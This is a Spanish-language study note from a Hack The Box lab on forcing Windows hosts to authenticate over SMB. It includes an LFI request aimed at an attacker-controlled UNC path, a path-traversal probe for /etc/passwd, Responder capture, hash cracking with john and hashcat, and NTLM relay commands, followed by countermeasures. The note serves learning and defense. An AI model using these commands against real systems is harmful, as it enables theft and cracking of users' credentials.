---
tags:
  - tecnica
  - categoria/credential-access
  - categoria/initial-access
  - os/windows
  - nivel/medio
fecha_aprendida: 2026-08-22
fuente: HTB/Responder
mitre_technique: T1187
---
# ⚔️ Forced Authentication (SMB/UNC vía LFI)

> [!abstract] Resumen
> Un atacante fuerza a un host Windows a autenticarse contra un recurso SMB que controla, explotando cualquier punto donde la aplicación acepte una ruta arbitraria (LFI, `.SCF`/`.LNK` malicioso, campo de icono, etc.) y apuntándola a un UNC path (`//IP_atacante/recurso`). Windows intenta autenticarse automáticamente contra ese recurso — el atacante captura el hash NetNTLMv2 con Responder u otra herramienta. A diferencia del poisoning LLMNR/NBT-NS, aquí el atacante **no espera** un fallo de resolución de nombres: lo dispara activamente.

---

## ¿Qué es y por qué funciona?

Cuando un sistema Windows accede a una ruta UNC (`\\host\share` o, en contexto web, `//host/share`), intenta autenticarse automáticamente contra ese recurso usando las credenciales de la sesión actual — esto es comportamiento esperado para que el usuario no tenga que reingresar contraseña al acceder a recursos de red internos. El problema: Windows no verifica que el host de destino sea confiable antes de enviar el hash NTLM. Si un atacante logra que la ruta UNC apunte a un servidor bajo su control (vía cualquier vector que acepte una ruta no sanitizada), captura el intercambio challenge-response completo sin que la víctima haga nada más que "cargar" ese recurso.

En HTB Responder, el vector de entrada fue un LFI (`index.php?page=` con `include()` sin sanitizar) — pero el mismo principio aplica a documentos con plantillas remotas (`Template Injection`, T1221), archivos `.SCF`/`.LNK` con icono apuntando a un UNC path, o abuso de `EfsRpcOpenFileRaw` (PetitPotam).

---

## Condiciones necesarias para que aplique

> [!warning] Requisitos
> - Algún mecanismo que acepte una ruta controlada por el atacante y la resuelva del lado del host Windows (LFI, RFI, campo de icono, plantilla de documento, RPC vulnerable)
> - El atacante debe tener una IP alcanzable por la víctima (mismo segmento de red o túnel VPN en el caso de labs como HTB) donde levantar el servidor SMB falso
> - Idealmente, sin SMB Signing forzado en la víctima (si no, el hash capturado no puede reenviarse con relay, solo crackearse)

---

## Procedimiento

### Detección / Enumeración

```bash
# Buscar cualquier parámetro que acepte una ruta de archivo sin validar
# (page=, file=, template=, doc=, etc.) y probar path traversal primero
http://target/index.php?page=../../../../../../etc/passwd
```

### Explotación

```bash
# Paso 1: levantar el listener ANTES de disparar el trigger
sudo responder -I tun0

# Paso 2: apuntar el parámetro vulnerable a un UNC path con la IP propia
# (la IP de la interfaz por la que la víctima puede alcanzarte — tun0 en HTB,
# NO la IP de la víctima ni una IP de LAN local sin ruta hacia el lab)
http://target/index.php?page=//IP_ATACANTE/whatever

# El include()/acceso puede fallar del lado del servidor (error visible) —
# no importa: el intento de autenticación SMB ya ocurrió antes del fallo.

# Paso 3: hash capturado por Responder, guardar y crackear
john -w=/usr/share/wordlists/rockyou.txt hash.txt
# o: hashcat -m 5600 hash.txt rockyou.txt
```

> [!tip] Variaciones comunes
> - Si SMB Signing no está forzado, el hash puede reenviarse (relay) con `ntlmrelayx.py` en vez de crackearse
> - PetitPotam y variantes abusan de RPCs de Windows (EFSRPC, spoolsample) para lograr lo mismo sin necesitar un LFI web
> - Diferencia clave con LLMNR/NBT-NS Poisoning ([[Técnicas/5_Active-Directory/LLMNR-NBTNS-Poisoning]]): ahí el atacante espera pasivamente un broadcast fallido; aquí dispara la autenticación activamente especificando el destino exacto

---

## Herramientas asociadas

| Herramienta | Función | Comando base |
| ----------- | ------- | ------------ |
| Responder | Levanta el servidor SMB falso y captura el hash | `sudo responder -I <iface>` |
| John the Ripper | Cracking offline del hash NetNTLMv2 | `john -w=wordlist.txt hash.txt` |
| hashcat | Alternativa a John (modo 5600) | `hashcat -m 5600 hash.txt wordlist.txt` |
| Impacket ntlmrelayx | Relay del hash en vez de crackeo (si no hay SMB Signing) | `ntlmrelayx.py -tf targets.txt` |

---

## Contramedidas (defensa)

> [!info] ¿Cómo se previene?
> La causa raíz siempre está en el punto de entrada (sanitizar el parámetro/campo vulnerable) — deshabilitar LLMNR/NBT-NS NO mitiga este vector porque el atacante no depende de esos protocolos. Remediación real: bloquear SMB (445) saliente hacia IPs externas/no inventariadas en el firewall perimetral y del host, forzar SMB Signing para inutilizar el relay, y políticas de contraseña fuertes para que un hash capturado no sea crackeable en tiempo razonable.

---

## Dónde la usé

- [[HTB/Responder/Responder]] — LFI en `index.php?page=` usado para forzar autenticación SMB; hash de `Administrator` capturado con Responder, crackeado con John (`badminton`)

---

## Referencias

- [MITRE ATT&CK - T1187 Forced Authentication](https://attack.mitre.org/techniques/T1187/)
- [HackTricks - Forced Authentication / NTLM](https://book.hacktricks.xyz/windows-hardening/ntlm)
- [GitHub - Hashjacking / Forced SMB Auth](https://github.com/leftbitca/hashjacking)
